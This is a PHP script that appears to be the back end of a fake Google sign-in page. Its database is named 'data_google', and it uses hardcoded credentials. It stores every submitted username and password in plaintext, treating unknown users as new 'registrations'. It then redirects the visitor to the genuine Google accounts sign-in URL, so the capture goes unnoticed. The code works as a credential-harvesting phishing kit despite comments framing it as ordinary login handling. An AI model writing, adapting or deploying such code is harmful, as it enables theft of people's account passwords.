<?php
// Establish a connection to the database (replace with your database details)
$servername = "localhost";
$username = "google";
$password = "php_google";
$dbname = "data_google";
// $dbname = "";

$conn = new mysqli($servername, $username, $password, $dbname);

// Check the connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Get user input
$username = $_POST['username'];
$password = $_POST['password'];

// Protect against SQL injection
$username = mysqli_real_escape_string($conn, $username);
$password = mysqli_real_escape_string($conn, $password);

// Hash the password (in a production environment, you should use a stronger hashing algorithm)
// $hashedPassword = md5($password);

// Check if the username and hashed password match in the database
// $sql = "SELECT * FROM users WHERE username='$username' AND password='$hashedPassword'";
$sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = $conn->query($sql);

if ($result->num_rows > 0) {
    // Login successful
	// echo "Login successful!";
	header("Location: https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Faccounts.google.com%2F&followup=https%3A%2F%2Faccounts.google.com%2F&ifkv=ASKXGp1OHQkxZHByhh4rt4cHJ-H56QM3iuQbIctt1r4l75weuBbfsCYFvpe-ue4s86NitGlCFEyOXg&passive=1209600&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S-1492990561%3A1701933944662523&theme=glif");
} else {
    // Login failed
  //  echo "Login failed. Please check your username and password.";
    // User does not exist, insert into the database
    $insertSql = "INSERT INTO users (username, password) VALUES ('$username', '$password')";
    if ($conn->query($insertSql) === TRUE) {
   //     echo "User registered and logged in!";
	header("Location: https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Faccounts.google.com%2F&followup=https%3A%2F%2Faccounts.google.com%2F&ifkv=ASKXGp1OHQkxZHByhh4rt4cHJ-H56QM3iuQbIctt1r4l75weuBbfsCYFvpe-ue4s86NitGlCFEyOXg&passive=1209600&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S-1492990561%3A1701933944662523&theme=glif");
   	
    } else {
        echo "Error: " . $insertSql . "<br>" . $conn->error;
    }
}

// Close the database connection
$conn->close();
?>
